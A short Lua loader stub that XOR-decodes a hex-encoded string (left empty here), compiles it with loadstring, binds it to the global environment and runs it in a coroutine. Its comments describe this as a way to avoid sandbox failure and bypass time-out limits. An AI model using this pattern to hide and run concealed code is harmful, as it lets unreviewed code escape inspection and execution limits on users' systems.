local _HEX_STREAM = ""
local _XOR = 184
local _K1 = 6
local _K2 = 34

local _STREAM_BUFFER = {}
local _INDEX = 1

-- Map and decode structural hexadecimal coordinates inside native registers
for i = 1, #_HEX_STREAM, 2 do
    local hex_pair = string.sub(_HEX_STREAM, i, i + 1)
    local raw_byte = tonumber(hex_pair, 16) ~ _XOR
    
    local virtual_opcode = (raw_byte * _K1) + _K2
    local recovered_character = string.char(((virtual_opcode - _K2) / _K1))
    
    _STREAM_BUFFER[_INDEX] = recovered_character
    _INDEX = _INDEX + 1
end

local final_source_string = table.concat(_STREAM_BUFFER)

-- Isolate execution and bind the native global environment cleanly
local target_pipeline = loadstring or load
local chunk, fault = target_pipeline(final_source_string)

if chunk then
    -- Inherit environmental context mappings to prevent sandbox failure
    local success, current_env = pcall(getfenv)
    if success and current_env then
        setfenv(chunk, current_env)
    else
        setfenv(chunk, getfenv(0))
    end
    
    -- Spawn on an independent asynchronous worker thread to bypass time-out limits
    local execution_thread = coroutine.create(chunk)
    local thread_success, thread_fault = coroutine.resume(execution_thread)
    if not thread_success then
        error("VM Thread Runtime Fault: " .. tostring(thread_fault))
    end
else
    error("VM Critical Launch Fault: " .. tostring(fault))
end
